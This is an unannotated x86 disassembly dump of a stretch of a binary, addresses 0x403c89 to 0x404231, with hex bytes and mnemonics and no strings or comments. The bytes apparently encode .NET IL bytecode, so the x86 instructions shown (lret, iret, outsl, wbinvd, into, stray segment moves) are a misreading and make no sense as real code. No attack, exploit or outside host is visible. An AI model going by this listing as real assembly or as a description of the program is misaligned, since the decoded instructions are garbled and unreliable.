  403c89:	13 04 11             	adc    (%ecx,%edx,1),%eax
  403c8c:	04 09                	add    $0x9,%al
  403c8e:	8e 69 32             	mov    0x32(%ecx),%gs
  403c91:	cb                   	lret
  403c92:	08 17                	or     %dl,(%edi)
  403c94:	58                   	pop    %eax
  403c95:	0c 08                	or     $0x8,%al
  403c97:	07                   	pop    %es
  403c98:	8e 69 32             	mov    0x32(%ecx),%gs
  403c9b:	ae                   	scas   %es:(%edi),%al
  403c9c:	de 03                	fiadds (%ebx)
  403c9e:	26 de 00             	fiadds %es:(%eax)
  403ca1:	2a 00                	sub    (%eax),%al
  403ca3:	00 01                	add    %al,(%ecx)
  403ca5:	1c 00                	sbb    $0x0,%al
  403ca7:	00 00                	add    %al,(%eax)
  403ca9:	00 49 00             	add    %cl,0x0(%ecx)
  403cac:	09 52 00             	or     %edx,0x0(%edx)
  403caf:	03 13                	add    (%ebx),%edx
  403cb1:	00 00                	add    %al,(%eax)
  403cb3:	01 00                	add    %eax,(%eax)
  403cb5:	00 00                	add    %al,(%eax)
  403cb7:	00 6e 6e             	add    %ch,0x6e(%esi)
  403cba:	00 03                	add    %al,(%ebx)
  403cbc:	13 00                	adc    (%eax),%eax
  403cbe:	00 01                	add    %al,(%ecx)
  403cc0:	1b 30                	sbb    (%eax),%esi
  403cc2:	02 00                	add    (%eax),%al
  403cc4:	1e                   	push   %ds
  403cc5:	00 00                	add    %al,(%eax)
  403cc7:	00 09                	add    %cl,(%ecx)
  403cc9:	00 00                	add    %al,(%eax)
  403ccb:	11 28                	adc    %ebp,(%eax)
  403ccd:	c7 00 00 0a 73 c8    	movl   $0xc8730a00,(%eax)
  403cd3:	00 00                	add    %al,(%eax)
  403cd5:	0a 20                	or     (%eax),%ah
  403cd7:	20 02                	and    %al,(%edx)
  403cd9:	00 00                	add    %al,(%eax)
  403cdb:	6f                   	outsl  %ds:(%esi),(%dx)
  403cdc:	c9                   	leave
  403cdd:	00 00                	add    %al,(%eax)
  403cdf:	0a 0a                	or     (%edx),%cl
  403ce1:	de 05 26 16 0a de    	fiadds 0xde0a1626
  403ce7:	00 06                	add    %al,(%esi)
  403ce9:	2a 00                	sub    (%eax),%al
  403ceb:	00 01                	add    %al,(%ecx)
  403ced:	10 00                	adc    %al,(%eax)
  403cef:	00 00                	add    %al,(%eax)
  403cf1:	00 00                	add    %al,(%eax)
  403cf3:	00 17                	add    %dl,(%edi)
  403cf5:	17                   	pop    %ss
  403cf6:	00 05 13 00 00 01    	add    %al,0x1000013
  403cfc:	f2 19 8d 57 00 00 01 	repnz sbb %ecx,0x1000057(%ebp)
  403d03:	25 16 1f 1a 28       	and    $0x281a1f16,%eax
  403d08:	2a 00                	sub    (%eax),%al
  403d0a:	00 0a                	add    %cl,(%edx)
  403d0c:	a2 25 17 1f 1c       	mov    %al,0x1c1f1725
  403d11:	28 2a                	sub    %ch,(%edx)
  403d13:	00 00                	add    %al,(%eax)
  403d15:	0a a2 25 18 28 90    	or     -0x6fd7e7db(%edx),%ah
  403d1b:	00 00                	add    %al,(%eax)
  403d1d:	0a a2 80 17 00 00    	or     0x1780(%edx),%ah
  403d23:	04 72                	add    $0x72,%al
  403d25:	10 15 00 70 80 18    	adc    %dl,0x18807000
  403d2b:	00 00                	add    %al,(%eax)
  403d2d:	04 73                	add    $0x73,%al
  403d2f:	3f                   	aas
  403d30:	00 00                	add    %al,(%eax)
  403d32:	0a 80 19 00 00 04    	or     0x4000019(%eax),%al
  403d38:	2a 00                	sub    (%eax),%al
  403d3a:	00 00                	add    %al,(%eax)
  403d3c:	13 30                	adc    (%eax),%esi
  403d3e:	02 00                	add    (%eax),%al
  403d40:	2f                   	das
  403d41:	00 00                	add    %al,(%eax)
  403d43:	00 25 00 00 11 12    	add    %ah,0x12110000
  403d49:	00 28                	add    %ch,(%eax)
  403d4b:	94                   	xchg   %eax,%esp
  403d4c:	00 00                	add    %al,(%eax)
  403d4e:	0a 7d 45             	or     0x45(%ebp),%bh
  403d51:	00 00                	add    %al,(%eax)
  403d53:	04 12                	add    $0x12,%al
  403d55:	00 15 7d 44 00 00    	add    %dl,0x447d
  403d5b:	04 12                	add    $0x12,%al
  403d5d:	00 7c 45 00          	add    %bh,0x0(%ebp,%eax,2)
  403d61:	00 04 12             	add    %al,(%edx,%edx,1)
  403d64:	00 28                	add    %ch,(%eax)
  403d66:	05 00 00 2b 12       	add    $0x122b0000,%eax
  403d6b:	00 7c 45 00          	add    %bh,0x0(%ebp,%eax,2)
  403d6f:	00 04 28             	add    %al,(%eax,%ebp,1)
  403d72:	96                   	xchg   %eax,%esi
  403d73:	00 00                	add    %al,(%eax)
  403d75:	0a 2a                	or     (%edx),%ch
  403d77:	2e 73 3f             	jae,pn 0x403db9
  403d7a:	00 00                	add    %al,(%eax)
  403d7c:	0a 80 1a 00 00 04    	or     0x400001a(%eax),%al
  403d82:	2a 00                	sub    (%eax),%al
  403d84:	1b 30                	sbb    (%eax),%esi
  403d86:	03 00                	add    (%eax),%eax
  403d88:	98                   	cwtl
  403d89:	00 00                	add    %al,(%eax)
  403d8b:	00 26                	add    %ah,(%esi)
  403d8d:	00 00                	add    %al,(%eax)
  403d8f:	11 28                	adc    %ebp,(%eax)
  403d91:	31 00                	xor    %eax,(%eax)
  403d93:	00 0a                	add    %cl,(%edx)
  403d95:	6f                   	outsl  %ds:(%esi),(%dx)
  403d96:	32 00                	xor    (%eax),%al
  403d98:	00 0a                	add    %cl,(%edx)
  403d9a:	6f                   	outsl  %ds:(%esi),(%dx)
  403d9b:	33 00                	xor    (%eax),%eax
  403d9d:	00 0a                	add    %cl,(%edx)
  403d9f:	0a 7e 1b             	or     0x1b(%esi),%bh
  403da2:	00 00                	add    %al,(%eax)
  403da4:	04 0b                	add    $0xb,%al
  403da6:	16                   	push   %ss
  403da7:	0c 2b                	or     $0x2b,%al
  403da9:	77 07                	ja     0x403db2
  403dab:	08 9a 0d 06 09 28    	or     %bl,0x2809060d(%edx)
  403db1:	4d                   	dec    %ebp
  403db2:	00 00                	add    %al,(%eax)
  403db4:	06                   	push   %es
  403db5:	2c 02                	sub    $0x2,%al
  403db7:	de 6e 09             	fisubrs 0x9(%esi)
  403dba:	28 24 00             	sub    %ah,(%eax,%eax,1)
  403dbd:	00 0a                	add    %cl,(%edx)
  403dbf:	2c 2b                	sub    $0x2b,%al
  403dc1:	06                   	push   %es
  403dc2:	73 ca                	jae    0x403d8e
  403dc4:	00 00                	add    %al,(%eax)
  403dc6:	0a 09                	or     (%ecx),%cl
  403dc8:	73 ca                	jae    0x403d94
  403dca:	00 00                	add    %al,(%eax)
  403dcc:	0a 13                	or     (%ebx),%dl
  403dce:	04 6f                	add    $0x6f,%al
  403dd0:	cb                   	lret
  403dd1:	00 00                	add    %al,(%eax)
  403dd3:	0a 11                	or     (%ecx),%dl
  403dd5:	04 6f                	add    $0x6f,%al
  403dd7:	cb                   	lret
  403dd8:	00 00                	add    %al,(%eax)
  403dda:	0a 33                	or     (%ebx),%dh
  403ddc:	0f 09                	wbinvd
  403dde:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  403de2:	0a 26                	or     (%esi),%ah
  403de4:	16                   	push   %ss
  403de5:	28 cc                	sub    %cl,%ah
  403de7:	00 00                	add    %al,(%eax)
  403de9:	0a de                	or     %dh,%bl
  403deb:	3b 06                	cmp    (%esi),%eax
  403ded:	09 17                	or     %edx,(%edi)
  403def:	28 cd                	sub    %cl,%ch
  403df1:	00 00                	add    %al,(%eax)
  403df3:	0a 09                	or     (%ecx),%cl
  403df5:	1c 28                	sbb    $0x28,%al
  403df7:	c4 00                	les    (%eax),%eax
  403df9:	00 0a                	add    %cl,(%edx)
  403dfb:	09 28                	or     %ebp,(%eax)
  403dfd:	44                   	inc    %esp
  403dfe:	00 00                	add    %al,(%eax)
  403e00:	0a 26                	or     (%esi),%ah
  403e02:	16                   	push   %ss
  403e03:	28 cc                	sub    %cl,%ah
  403e05:	00 00                	add    %al,(%eax)
  403e07:	0a de                	or     %dh,%bl
  403e09:	13 26                	adc    (%esi),%esp
  403e0b:	20 2c 01             	and    %ch,(%ecx,%eax,1)
  403e0e:	00 00                	add    %al,(%eax)
  403e10:	28 3a                	sub    %bh,(%edx)
  403e12:	00 00                	add    %al,(%eax)
  403e14:	0a de                	or     %dh,%bl
  403e16:	06                   	push   %es
  403e17:	26 de 03             	fiadds %es:(%ebx)
  403e1a:	26 de 00             	fiadds %es:(%eax)
  403e1d:	08 17                	or     %dl,(%edi)
  403e1f:	58                   	pop    %eax
  403e20:	0c 08                	or     $0x8,%al
  403e22:	07                   	pop    %es
  403e23:	8e 69 32             	mov    0x32(%ecx),%gs
  403e26:	83 2a 01             	subl   $0x1,(%edx)
  403e29:	28 00                	sub    %al,(%eax)
  403e2b:	00 00                	add    %al,(%eax)
  403e2d:	00 1e                	add    %bl,(%esi)
  403e2f:	00 5c 7a 00          	add    %bl,0x0(%edx,%edi,2)
  403e33:	0d 40 00 00 01       	or     $0x1000040,%eax
  403e38:	00 00                	add    %al,(%eax)
  403e3a:	1e                   	push   %ds
  403e3b:	00 5c 87 00          	add    %bl,0x0(%edi,%eax,4)
  403e3f:	03 41 00             	add    0x0(%ecx),%eax
  403e42:	00 01                	add    %al,(%ecx)
  403e44:	00 00                	add    %al,(%eax)
  403e46:	1e                   	push   %ds
  403e47:	00 5c 8a 00          	add    %bl,0x0(%edx,%ecx,4)
  403e4b:	03 13                	add    (%ebx),%edx
  403e4d:	00 00                	add    %al,(%eax)
  403e4f:	01 ce                	add    %ecx,%esi
  403e51:	02 28                	add    (%eax),%ch
  403e53:	ce                   	into
  403e54:	00 00                	add    %al,(%eax)
  403e56:	0a 17                	or     (%edi),%dl
  403e58:	8d 74 00 00          	lea    0x0(%eax,%eax,1),%esi
  403e5c:	01 25 16 1f 5c 9d    	add    %esp,0x9d5c1f16
  403e62:	6f                   	outsl  %ds:(%esi),(%dx)
  403e63:	cf                   	iret
  403e64:	00 00                	add    %al,(%eax)
  403e66:	0a 03                	or     (%ebx),%al
  403e68:	28 ce                	sub    %cl,%dh
  403e6a:	00 00                	add    %al,(%eax)
  403e6c:	0a 17                	or     (%edi),%dl
  403e6e:	8d 74 00 00          	lea    0x0(%eax,%eax,1),%esi
  403e72:	01 25 16 1f 5c 9d    	add    %esp,0x9d5c1f16
  403e78:	6f                   	outsl  %ds:(%esi),(%dx)
  403e79:	cf                   	iret
  403e7a:	00 00                	add    %al,(%eax)
  403e7c:	0a 1b                	or     (%ebx),%bl
  403e7e:	28 d0                	sub    %dl,%al
  403e80:	00 00                	add    %al,(%eax)
  403e82:	0a 2a                	or     (%edx),%ch
  403e84:	13 30                	adc    (%eax),%esi
  403e86:	05 00 46 00 00       	add    $0x4600,%eax
  403e8b:	00 00                	add    %al,(%eax)
  403e8d:	00 00                	add    %al,(%eax)
  403e8f:	00 19                	add    %bl,(%ecx)
  403e91:	8d 57 00             	lea    0x0(%edi),%edx
  403e94:	00 01                	add    %al,(%ecx)
  403e96:	25 16 1f 1a 28       	and    $0x281a1f16,%eax
  403e9b:	2a 00                	sub    (%eax),%al
  403e9d:	00 0a                	add    %cl,(%edx)
  403e9f:	72 2a                	jb     0x403ecb
  403ea1:	15 00 70 28 2b       	adc    $0x2b287000,%eax
  403ea6:	00 00                	add    %al,(%eax)
  403ea8:	0a a2 25 17 28 90    	or     -0x6fd7e8db(%edx),%ah
  403eae:	00 00                	add    %al,(%eax)
  403eb0:	0a 72 2a             	or     0x2a(%edx),%dh
  403eb3:	15 00 70 28 2b       	adc    $0x2b287000,%eax
  403eb8:	00 00                	add    %al,(%eax)
  403eba:	0a a2 25 18 1f 1c    	or     0x1c1f1825(%edx),%ah
  403ec0:	28 2a                	sub    %ch,(%edx)
  403ec2:	00 00                	add    %al,(%eax)
  403ec4:	0a 72 2a             	or     0x2a(%edx),%dh
  403ec7:	15 00 70 28 2b       	adc    $0x2b287000,%eax
  403ecc:	00 00                	add    %al,(%eax)
  403ece:	0a a2 80 1b 00 00    	or     0x1b80(%edx),%ah
  403ed4:	04 2a                	add    $0x2a,%al
  403ed6:	00 00                	add    %al,(%eax)
  403ed8:	13 30                	adc    (%eax),%esi
  403eda:	02 00                	add    (%eax),%al
  403edc:	48                   	dec    %eax
  403edd:	00 00                	add    %al,(%eax)
  403edf:	00 00                	add    %al,(%eax)
  403ee1:	00 00                	add    %al,(%eax)
  403ee3:	00 7e 1d             	add    %bh,0x1d(%esi)
  403ee6:	00 00                	add    %al,(%eax)
  403ee8:	04 2c                	add    $0x2c,%al
  403eea:	01 2a                	add    %ebp,(%edx)
  403eec:	17                   	pop    %ss
  403eed:	80 1d 00 00 04 73 bf 	sbbb   $0xbf,0x73040000
  403ef4:	00 00                	add    %al,(%eax)
  403ef6:	0a 80 1e 00 00 04    	or     0x400001e(%eax),%al
  403efc:	7e 48                	jle    0x403f46
  403efe:	00 00                	add    %al,(%eax)
  403f00:	04 25                	add    $0x25,%al
  403f02:	2d 17 26 7e 47       	sub    $0x477e2617,%eax
  403f07:	00 00                	add    %al,(%eax)
  403f09:	04 fe                	add    $0xfe,%al
  403f0b:	06                   	push   %es
  403f0c:	7b 00                	jnp    0x403f0e
  403f0e:	00 06                	add    %al,(%esi)
  403f10:	73 d1                	jae    0x403ee3
  403f12:	00 00                	add    %al,(%eax)
  403f14:	0a 25 80 48 00 00    	or     0x4880,%ah
  403f1a:	04 7e                	add    $0x7e,%al
  403f1c:	1e                   	push   %ds
  403f1d:	00 00                	add    %al,(%eax)
  403f1f:	04 6f                	add    $0x6f,%al
  403f21:	d2 00                	rolb   %cl,(%eax)
  403f23:	00 0a                	add    %cl,(%edx)
  403f25:	28 d3                	sub    %dl,%bl
  403f27:	00 00                	add    %al,(%eax)
  403f29:	0a 26                	or     (%esi),%ah
  403f2b:	2a 66 7e             	sub    0x7e(%esi),%ah
  403f2e:	1d 00 00 04 2d       	sbb    $0x2d040000,%eax
  403f33:	01 2a                	add    %ebp,(%edx)
  403f35:	7e 1e                	jle    0x403f55
  403f37:	00 00                	add    %al,(%eax)
  403f39:	04 6f                	add    $0x6f,%al
  403f3b:	be 00 00 0a 16       	mov    $0x160a0000,%esi
  403f40:	80 1d 00 00 04 2a 00 	sbbb   $0x0,0x2a040000
  403f47:	00 13                	add    %dl,(%ebx)
  403f49:	30 02                	xor    %al,(%edx)
  403f4b:	00 2f                	add    %ch,(%edi)
  403f4d:	00 00                	add    %al,(%eax)
  403f4f:	00 27                	add    %ah,(%edi)
  403f51:	00 00                	add    %al,(%eax)
  403f53:	11 12                	adc    %edx,(%edx)
  403f55:	00 28                	add    %ch,(%eax)
  403f57:	94                   	xchg   %eax,%esp
  403f58:	00 00                	add    %al,(%eax)
  403f5a:	0a 7d 4a             	or     0x4a(%ebp),%bh
  403f5d:	00 00                	add    %al,(%eax)
  403f5f:	04 12                	add    $0x12,%al
  403f61:	00 15 7d 49 00 00    	add    %dl,0x497d
  403f67:	04 12                	add    $0x12,%al
  403f69:	00 7c 4a 00          	add    %bh,0x0(%edx,%ecx,2)
  403f6d:	00 04 12             	add    %al,(%edx,%edx,1)
  403f70:	00 28                	add    %ch,(%eax)
  403f72:	06                   	push   %es
  403f73:	00 00                	add    %al,(%eax)
  403f75:	2b 12                	sub    (%edx),%edx
  403f77:	00 7c 4a 00          	add    %bh,0x0(%edx,%ecx,2)
  403f7b:	00 04 28             	add    %al,(%eax,%ebp,1)
  403f7e:	96                   	xchg   %eax,%esi
  403f7f:	00 00                	add    %al,(%eax)
  403f81:	0a 2a                	or     (%edx),%ch
  403f83:	00 1b                	add    %bl,(%ebx)
  403f85:	30 01                	xor    %al,(%ecx)
  403f87:	00 17                	add    %dl,(%edi)
  403f89:	00 00                	add    %al,(%eax)
  403f8b:	00 00                	add    %al,(%eax)
  403f8d:	00 00                	add    %al,(%eax)
  403f8f:	00 1b                	add    %bl,(%ebx)
  403f91:	28 d4                	sub    %dl,%ah
  403f93:	00 00                	add    %al,(%eax)
  403f95:	0a 02                	or     (%edx),%al
  403f97:	28 d5                	sub    %dl,%ch
  403f99:	00 00                	add    %al,(%eax)
  403f9b:	0a 28                	or     (%eax),%ch
  403f9d:	d6                   	salc
  403f9e:	00 00                	add    %al,(%eax)
  403fa0:	0a de                	or     %dh,%bl
  403fa2:	03 26                	add    (%esi),%esp
  403fa4:	de 00                	fiadds (%eax)
  403fa6:	2a 00                	sub    (%eax),%al
  403fa8:	01 10                	add    %edx,(%eax)
  403faa:	00 00                	add    %al,(%eax)
  403fac:	00 00                	add    %al,(%eax)
  403fae:	00 00                	add    %al,(%eax)
  403fb0:	13 13                	adc    (%ebx),%edx
  403fb2:	00 03                	add    %al,(%ebx)
  403fb4:	13 00                	adc    (%eax),%eax
  403fb6:	00 01                	add    %al,(%ecx)
  403fb8:	46                   	inc    %esi
  403fb9:	73 3f                	jae    0x403ffa
  403fbb:	00 00                	add    %al,(%eax)
  403fbd:	0a 80 1c 00 00 04    	or     0x400001c(%eax),%al
  403fc3:	16                   	push   %ss
  403fc4:	80 1d 00 00 04 2a 00 	sbbb   $0x0,0x2a040000
  403fcb:	00 13                	add    %dl,(%ebx)
  403fcd:	30 02                	xor    %al,(%edx)
  403fcf:	00 42 00             	add    %al,0x0(%edx)
  403fd2:	00 00                	add    %al,(%eax)
  403fd4:	00 00                	add    %al,(%eax)
  403fd6:	00 00                	add    %al,(%eax)
  403fd8:	7e 22                	jle    0x403ffc
  403fda:	00 00                	add    %al,(%eax)
  403fdc:	04 2c                	add    $0x2c,%al
  403fde:	01 2a                	add    %ebp,(%edx)
  403fe0:	73 bf                	jae    0x403fa1
  403fe2:	00 00                	add    %al,(%eax)
  403fe4:	0a 80 22 00 00 04    	or     0x4000022(%eax),%al
  403fea:	7e 4f                	jle    0x40403b
  403fec:	00 00                	add    %al,(%eax)
  403fee:	04 25                	add    $0x25,%al
  403ff0:	2d 17 26 7e 4e       	sub    $0x4e7e2617,%eax
  403ff5:	00 00                	add    %al,(%eax)
  403ff7:	04 fe                	add    $0xfe,%al
  403ff9:	06                   	push   %es
  403ffa:	80 00 00             	addb   $0x0,(%eax)
  403ffd:	06                   	push   %es
  403ffe:	73 d1                	jae    0x403fd1
  404000:	00 00                	add    %al,(%eax)
  404002:	0a 25 80 4f 00 00    	or     0x4f80,%ah
  404008:	04 7e                	add    $0x7e,%al
  40400a:	22 00                	and    (%eax),%al
  40400c:	00 04 6f             	add    %al,(%edi,%ebp,2)
  40400f:	d2 00                	rolb   %cl,(%eax)
  404011:	00 0a                	add    %cl,(%edx)
  404013:	28 d3                	sub    %dl,%bl
  404015:	00 00                	add    %al,(%eax)
  404017:	0a 26                	or     (%esi),%ah
  404019:	2a 66 7e             	sub    0x7e(%esi),%ah
  40401c:	22 00                	and    (%eax),%al
  40401e:	00 04 2d 01 2a 7e 22 	add    %al,0x227e2a01(,%ebp,1)
  404025:	00 00                	add    %al,(%eax)
  404027:	04 6f                	add    $0x6f,%al
  404029:	be 00 00 0a 14       	mov    $0x140a0000,%esi
  40402e:	80 22 00             	andb   $0x0,(%edx)
  404031:	00 04 2a             	add    %al,(%edx,%ebp,1)
  404034:	13 30                	adc    (%eax),%esi
  404036:	02 00                	add    (%eax),%al
  404038:	2f                   	das
  404039:	00 00                	add    %al,(%eax)
  40403b:	00 28                	add    %ch,(%eax)
  40403d:	00 00                	add    %al,(%eax)
  40403f:	11 12                	adc    %edx,(%edx)
  404041:	00 28                	add    %ch,(%eax)
  404043:	94                   	xchg   %eax,%esp
  404044:	00 00                	add    %al,(%eax)
  404046:	0a 7d 52             	or     0x52(%ebp),%bh
  404049:	00 00                	add    %al,(%eax)
  40404b:	04 12                	add    $0x12,%al
  40404d:	00 15 7d 51 00 00    	add    %dl,0x517d
  404053:	04 12                	add    $0x12,%al
  404055:	00 7c 52 00          	add    %bh,0x0(%edx,%edx,2)
  404059:	00 04 12             	add    %al,(%edx,%edx,1)
  40405c:	00 28                	add    %ch,(%eax)
  40405e:	07                   	pop    %es
  40405f:	00 00                	add    %al,(%eax)
  404061:	2b 12                	sub    (%edx),%edx
  404063:	00 7c 52 00          	add    %bh,0x0(%edx,%edx,2)
  404067:	00 04 28             	add    %al,(%eax,%ebp,1)
  40406a:	96                   	xchg   %eax,%esi
  40406b:	00 00                	add    %al,(%eax)
  40406d:	0a 2a                	or     (%edx),%ch
  40406f:	00 1b                	add    %bl,(%ebx)
  404071:	30 05 00 57 00 00    	xor    %al,0x5700
  404077:	00 29                	add    %ch,(%ecx)
  404079:	00 00                	add    %al,(%eax)
  40407b:	11 02                	adc    %eax,(%edx)
  40407d:	8d 74 00 00          	lea    0x0(%eax,%eax,1),%esi
  404081:	01 0a                	add    %ecx,(%edx)
  404083:	7e 20                	jle    0x4040a5
  404085:	00 00                	add    %al,(%eax)
  404087:	04 0b                	add    $0xb,%al
  404089:	16                   	push   %ss
  40408a:	0c 07                	or     $0x7,%al
  40408c:	12 02                	adc    (%edx),%al
  40408e:	28 d7                	sub    %dl,%bh
  404090:	00 00                	add    %al,(%eax)
  404092:	0a 16                	or     (%esi),%dl
  404094:	0d 2b 25 06 09       	or     $0x906252b,%eax
  404099:	72 40                	jb     0x4040db
  40409b:	15 00 70 7e 20       	adc    $0x207e7000,%eax
  4040a0:	00 00                	add    %al,(%eax)
  4040a2:	04 72                	add    $0x72,%al
  4040a4:	40                   	inc    %eax
  4040a5:	15 00 70 28 41       	adc    $0x41287000,%eax
  4040aa:	00 00                	add    %al,(%eax)
  4040ac:	0a 6f c0             	or     -0x40(%edi),%ch
  4040af:	00 00                	add    %al,(%eax)
  4040b1:	0a 28                	or     (%eax),%ch
  4040b3:	c1 00 00             	roll   $0x0,(%eax)
  4040b6:	0a 9d 09 17 58 0d    	or     0xd581709(%ebp),%bl
  4040bc:	09 02                	or     %eax,(%edx)
  4040be:	32 d7                	xor    %bh,%dl
  4040c0:	de 0a                	fimuls (%edx)
  4040c2:	08 2c 06             	or     %ch,(%esi,%eax,1)
  4040c5:	07                   	pop    %es
  4040c6:	28 d8                	sub    %bl,%al
  4040c8:	00 00                	add    %al,(%eax)
  4040ca:	0a dc                	or     %ah,%bl
  4040cc:	06                   	push   %es
  4040cd:	73 c2                	jae    0x404091
  4040cf:	00 00                	add    %al,(%eax)
  4040d1:	0a 2a                	or     (%edx),%ch
  4040d3:	00 01                	add    %al,(%ecx)
  4040d5:	10 00                	adc    %al,(%eax)
  4040d7:	00 02                	add    %al,(%edx)
  4040d9:	00 0f                	add    %cl,(%edi)
  4040db:	00 37                	add    %dh,(%edi)
  4040dd:	46                   	inc    %esi
  4040de:	00 0a                	add    %cl,(%edx)
  4040e0:	00 00                	add    %al,(%eax)
  4040e2:	00 00                	add    %al,(%eax)
  4040e4:	1b 30                	sbb    (%eax),%esi
  4040e6:	01 00                	add    %eax,(%eax)
  4040e8:	17                   	pop    %ss
  4040e9:	00 00                	add    %al,(%eax)
  4040eb:	00 00                	add    %al,(%eax)
  4040ed:	00 00                	add    %al,(%eax)
  4040ef:	00 18                	add    %bl,(%eax)
  4040f1:	28 d4                	sub    %dl,%ah
  4040f3:	00 00                	add    %al,(%eax)
  4040f5:	0a 02                	or     (%edx),%al
  4040f7:	28 d5                	sub    %dl,%ch
  4040f9:	00 00                	add    %al,(%eax)
  4040fb:	0a 28                	or     (%eax),%ch
  4040fd:	d6                   	salc
  4040fe:	00 00                	add    %al,(%eax)
  404100:	0a de                	or     %dh,%bl
  404102:	03 26                	add    (%esi),%esp
  404104:	de 00                	fiadds (%eax)
  404106:	2a 00                	sub    (%eax),%al
  404108:	01 10                	add    %edx,(%eax)
  40410a:	00 00                	add    %al,(%eax)
  40410c:	00 00                	add    %al,(%eax)
  40410e:	00 00                	add    %al,(%eax)
  404110:	13 13                	adc    (%ebx),%edx
  404112:	00 03                	add    %al,(%ebx)
  404114:	13 00                	adc    (%eax),%eax
  404116:	00 01                	add    %al,(%ecx)
  404118:	13 30                	adc    (%eax),%esi
  40411a:	05 00 50 00 00       	add    $0x5000,%eax
  40411f:	00 00                	add    %al,(%eax)
  404121:	00 00                	add    %al,(%eax)
  404123:	00 28                	add    %ch,(%eax)
  404125:	31 00                	xor    %eax,(%eax)
  404127:	00 0a                	add    %cl,(%edx)
  404129:	6f                   	outsl  %ds:(%esi),(%dx)
  40412a:	32 00                	xor    (%eax),%al
  40412c:	00 0a                	add    %cl,(%edx)
  40412e:	6f                   	outsl  %ds:(%esi),(%dx)
  40412f:	33 00                	xor    (%eax),%eax
  404131:	00 0a                	add    %cl,(%edx)
  404133:	80 1f 00             	sbbb   $0x0,(%edi)
  404136:	00 04 73             	add    %al,(%ebx,%esi,2)
  404139:	3f                   	aas
  40413a:	00 00                	add    %al,(%eax)
  40413c:	0a 80 20 00 00 04    	or     0x4000020(%eax),%al
  404142:	19 8d 57 00 00 01    	sbb    %ecx,0x1000057(%ebp)
  404148:	25 16 16 28 2a       	and    $0x2a281616,%eax
  40414d:	00 00                	add    %al,(%eax)
  40414f:	0a a2 25 17 1f 28    	or     0x281f1725(%edx),%ah
  404155:	28 2a                	sub    %ch,(%edx)
  404157:	00 00                	add    %al,(%eax)
  404159:	0a 72 72             	or     0x72(%edx),%dh
  40415c:	13 00                	adc    (%eax),%eax
  40415e:	70 28                	jo     0x404188
  404160:	2b 00                	sub    (%eax),%eax
  404162:	00 0a                	add    %cl,(%edx)
  404164:	a2 25 18 1b 28       	mov    %al,0x281b1825
  404169:	2a 00                	sub    (%eax),%al
  40416b:	00 0a                	add    %cl,(%edx)
  40416d:	a2 80 21 00 00       	mov    %al,0x2180
  404172:	04 2a                	add    $0x2a,%al
  404174:	1b 30                	sbb    (%eax),%esi
  404176:	03 00                	add    (%eax),%eax
  404178:	95                   	xchg   %eax,%ebp
  404179:	00 00                	add    %al,(%eax)
  40417b:	00 2a                	add    %ch,(%edx)
  40417d:	00 00                	add    %al,(%eax)
  40417f:	11 28                	adc    %ebp,(%eax)
  404181:	31 00                	xor    %eax,(%eax)
  404183:	00 0a                	add    %cl,(%edx)
  404185:	6f                   	outsl  %ds:(%esi),(%dx)
  404186:	32 00                	xor    (%eax),%al
  404188:	00 0a                	add    %cl,(%edx)
  40418a:	6f                   	outsl  %ds:(%esi),(%dx)
  40418b:	33 00                	xor    (%eax),%eax
  40418d:	00 0a                	add    %cl,(%edx)
  40418f:	0a 28                	or     (%eax),%ch
  404191:	d9 00                	flds   (%eax)
  404193:	00 0a                	add    %cl,(%edx)
  404195:	0b 16                	or     (%esi),%edx
  404197:	0c 2b                	or     $0x2b,%al
  404199:	74 07                	je     0x4041a2
  40419b:	08 9a 0d 09 6f da    	or     %bl,-0x2590f6f3(%edx)
  4041a1:	00 00                	add    %al,(%eax)
  4041a3:	0a 2c 5f             	or     (%edi,%ebx,2),%ch
  4041a6:	09 6f db             	or     %ebp,-0x25(%edi)
  4041a9:	00 00                	add    %al,(%eax)
  4041ab:	0a 18                	or     (%eax),%bl
  4041ad:	33 56 09             	xor    0x9(%esi),%edx
  4041b0:	6f                   	outsl  %ds:(%esi),(%dx)
  4041b1:	dc 00                	faddl  (%eax)
  4041b3:	00 0a                	add    %cl,(%edx)
  4041b5:	6f                   	outsl  %ds:(%esi),(%dx)
  4041b6:	dd 00                	fldl   (%eax)
  4041b8:	00 0a                	add    %cl,(%edx)
  4041ba:	13 04 11             	adc    (%ecx,%edx,1),%eax
  4041bd:	04 72                	add    $0x72,%al
  4041bf:	be 15 00 70 28       	mov    $0x28700015,%esi
  4041c4:	2b 00                	sub    (%eax),%eax
  4041c6:	00 0a                	add    %cl,(%edx)
  4041c8:	13 05 11 05 28 24    	adc    0x24280511,%eax
  4041ce:	00 00                	add    %al,(%eax)
  4041d0:	0a 2d 10 06 11 05    	or     0x5110610,%ch
  4041d6:	28 c3                	sub    %al,%bl
  4041d8:	00 00                	add    %al,(%eax)
  4041da:	0a 11                	or     (%ecx),%dl
  4041dc:	05 1c 28 c4 00       	add    $0xc4281c,%eax
  4041e1:	00 0a                	add    %cl,(%edx)
  4041e3:	11 04 72             	adc    %eax,(%edx,%esi,2)
  4041e6:	da 15 00 70 28 2b    	ficoml 0x2b287000
  4041ec:	00 00                	add    %al,(%eax)
  4041ee:	0a 13                	or     (%ebx),%dl
  4041f0:	06                   	push   %es
  4041f1:	11 06                	adc    %eax,(%esi)
  4041f3:	28 24 00             	sub    %ah,(%eax,%eax,1)
  4041f6:	00 0a                	add    %cl,(%edx)
  4041f8:	2d 0b 11 06 11       	sub    $0x1106110b,%eax
  4041fd:	05 11 04 28 5b       	add    $0x5b280411,%eax
  404202:	00 00                	add    %al,(%eax)
  404204:	06                   	push   %es
  404205:	de 03                	fiadds (%ebx)
  404207:	26 de 00             	fiadds %es:(%eax)
  40420a:	08 17                	or     %dl,(%edi)
  40420c:	58                   	pop    %eax
  40420d:	0c 08                	or     $0x8,%al
  40420f:	07                   	pop    %es
  404210:	8e 69 32             	mov    0x32(%ecx),%gs
  404213:	86 2a                	xchg   %ch,(%edx)
  404215:	00 00                	add    %al,(%eax)
  404217:	00 01                	add    %al,(%ecx)
  404219:	10 00                	adc    %al,(%eax)
  40421b:	00 00                	add    %al,(%eax)
  40421d:	00 1e                	add    %bl,(%esi)
  40421f:	00 69 87             	add    %ch,-0x79(%ecx)
  404222:	00 03                	add    %al,(%ebx)
  404224:	1a 00                	sbb    (%eax),%al
  404226:	00 01                	add    %al,(%ecx)
  404228:	1b 30                	sbb    (%eax),%esi
  40422a:	04 00                	add    $0x0,%al
  40422c:	9c                   	pushf
  40422d:	00 00                	add    %al,(%eax)
  40422f:	00 2b                	add    %ch,(%ebx)
  404231:	00 00                	add    %al,(%eax)
